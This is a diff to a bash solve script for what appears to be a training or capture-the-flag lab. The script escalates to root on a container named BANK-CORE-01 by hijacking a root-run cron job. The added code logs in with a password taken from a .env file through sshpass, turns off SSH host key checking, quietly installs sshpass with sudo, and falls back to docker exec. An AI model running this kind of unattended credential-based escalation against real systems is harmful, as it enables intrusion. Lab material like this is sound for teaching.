@@ -12,6 +12,11 @@
 #   Inside the container:   bash solve.sh
 #   From the host:          bash solve.sh        (auto-connects)
 #
+# On the host it prefers the real attack path (SSH with the recovered
+# credential) and will auto-install sshpass if it is missing. If SSH cannot
+# be used for any reason, it falls back to 'docker exec' so the solve still
+# completes - no manual steps required.
+#
 # Intended path: enumerate, find the writable-directory weakness, hijack the
 # root-run scheduled script, wait for cron, read the root-only evidence file.
 
@@ -23,7 +28,7 @@ err()  { printf '\n\033[0;31m[!]\033[0m %s\n' "$*" >&2; }
 
 # --- the escalation, run on BANK-CORE-01 ------------------------------
 # Kept as one command string so it runs identically whether executed
-# locally (inside the container) or piped over SSH from the host.
+# locally (inside the container) or piped over SSH / docker exec from the host.
 read -r -d '' ESCALATE <<'REMOTE'
 say()  { printf '\n==> %s\n' "$*"; }
 info() { printf '    %s\n' "$*"; }
@@ -79,7 +84,7 @@ if [ -d /opt/nexora/maintenance ] || [ "$(hostname)" = "BANK-CORE-01" ]; then
     exit 0
 fi
 
-# --- on the host: find the credential and SSH in ----------------------
+# --- on the host: find the credential ---------------------------------
 say "Not inside BANK-CORE-01 - connecting to the container"
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -96,8 +101,28 @@ if [ -n "$ENVFILE" ]; then
     [ -n "$u" ] && USER_NAME="$u"
     info "credential loaded from $ENVFILE"
 else
-    err "could not find .env - run from the repo, or SSH in manually"
+    err "could not find .env - will try docker exec instead"
 fi
+
+# --- docker exec fallback (runs the escalation with no SSH / no password) --
+CONTAINER="rtr-stage6"
+run_via_docker() {
+    command -v docker >/dev/null || return 1
+    docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$CONTAINER" || return 1
+    info "entering ${CONTAINER} as ${USER_NAME} via docker exec"
+    docker exec -u "$USER_NAME" -i "$CONTAINER" bash -s <<< "$ESCALATE"
+}
+
+# --- try to make SSH usable (install sshpass if missing) --------------
+ensure_sshpass() {
+    command -v sshpass >/dev/null && return 0
+    info "sshpass not found - attempting to install it"
+    if command -v apt-get >/dev/null; then
+        sudo apt-get install -y sshpass >/dev/null 2>&1 && command -v sshpass >/dev/null && \
+            { info "installed sshpass"; return 0; }
+    fi
+    return 1
+}
 
 # Prefer the static story IP (port 22); fall back to localhost:2222.
 HOST="127.0.0.1"; PORT="2222"
@@ -106,21 +131,29 @@ if timeout 2 bash -c "exec 3<>/dev/tcp/10.10.30.11/22" 2>/dev/null; then
 fi
 info "target: ${USER_NAME}@${HOST}:${PORT}"
 
-if ! command -v sshpass >/dev/null; then
-    err "sshpass is not installed (needed for non-interactive SSH)"
-    info "install it:  sudo apt install -y sshpass"
-    info "or SSH in yourself and run the escalation:"
-    info "  ssh ${USER_NAME}@${HOST} -p ${PORT}"
-    exit 1
-fi
-if [ -z "$PASS" ] || [ "$PASS" = "CHANGE_ME" ]; then
-    err "no usable STAGE6_PASSWORD in .env"
-    info "SSH in manually: ssh ${USER_NAME}@${HOST} -p ${PORT}"
-    exit 1
+# Decide the method: real SSH path if we have a password AND sshpass,
+# otherwise drop to docker exec so the solve still completes.
+if [ -n "$PASS" ] && [ "$PASS" != "CHANGE_ME" ] && ensure_sshpass; then
+    say "Running the escalation over SSH"
+    if sshpass -p "$PASS" ssh \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout=8 \
+            -p "$PORT" "${USER_NAME}@${HOST}" "bash -s" <<< "$ESCALATE"; then
+        exit 0
+    fi
+    err "SSH attempt failed - falling back to docker exec"
 fi
 
-# Run the escalation inside the container over SSH.
-sshpass -p "$PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -o UserKnownHostsFile=/dev/null \
-    -p "$PORT" "${USER_NAME}@${HOST}" "bash -s" <<< "$ESCALATE"
+say "Running the escalation via docker exec"
+if run_via_docker; then
+    exit 0
+fi
+
+# --- nothing worked: tell the operator how to finish by hand ----------
+err "could not reach BANK-CORE-01 automatically"
+info "the container may be down - bring it up:  ./scripts/reset.sh stage6"
+info "or do it by hand:"
+info "  ssh ${USER_NAME}@${HOST} -p ${PORT}        # password is STAGE6_PASSWORD in .env"
+info "  (then inside the container)  bash solve.sh"
+exit 1
